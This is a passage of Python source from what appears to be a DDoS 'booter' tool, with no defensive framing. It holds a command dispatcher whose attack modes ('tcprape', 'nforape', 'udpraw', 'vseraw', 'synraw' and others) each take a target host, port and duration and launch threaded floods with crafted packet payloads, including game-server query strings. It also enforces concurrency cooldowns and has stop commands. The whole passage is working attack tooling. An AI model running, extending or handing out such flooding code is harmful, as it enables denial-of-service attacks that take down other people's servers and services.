					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "tcprape":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "nforape":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "udpraw":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\0\x14\0\x01\x03"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "tcpraw":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "hexraw":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "stdraw":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "vseraw":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "synraw":
			try:
				if running >= 1:
					print("\033[37mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					command, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system(clear)
					print(attacked)
					time.sleep(1)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif command == "stopattacks":
			Screen.wrapper(stp)
			os.system(clear)
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif command == "stop":
			Screen.wrapper(stp)
			os.system(clear)
			attack = False
			while not attack:
				if aid == 0:
					attack = True

		else:
			main()


try:
	clear = "clear"
	os.system(clear)
	print(banner)
	main()
except KeyboardInterrupt:
	exit()